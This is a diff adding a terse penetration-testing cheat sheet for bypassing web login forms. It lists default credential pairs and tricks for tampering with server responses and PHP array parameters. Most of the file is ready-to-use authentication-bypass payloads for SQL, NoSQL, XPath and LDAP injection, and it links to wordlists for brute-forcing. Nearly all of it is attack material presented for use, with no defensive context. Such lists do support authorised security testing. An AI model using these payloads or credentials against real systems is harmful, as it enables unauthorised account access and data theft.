@@ -1,0 +1,63 @@
+https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#default-credentials
+defualt credentials :
+admin:admin
+admin:password
+author:author
+administrator:password
+admin123:password
+username:pass12345
+and many of defualt credentials
+
+Bypass by SQL Injection:
+inject username or paswword with a lot of payloads:
+=> error based
+=> time  based
+
+By Manipulating the Response:
+change the status of response from 
+200 => 302
+failed => success
+error => success
+403 => 200
+403 => 302
+false => true
+
+bruteforce list
+https://github.com/six2dez/OneListForAll/tree/main
+
+Check the PHP comparisons error:
+user[]=a&pwd=b , user=a&pwd[]=b , user[]=a&pwd[]=b
+
+Normal sql: ' or 1=1-- -
+Mongo sql: ' || 1==1//    or    ' || 1==1%00     or    admin' || 'a'=='a
+https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass
+
+ XPath Injection:
+' or '1'='1
+' or ''='
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+
+ LDAP Injection:
+*
+*)(&
+*)(|(&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+pwd
+admin)(!(&(|
+pwd))
+admin))(|(|
+
+
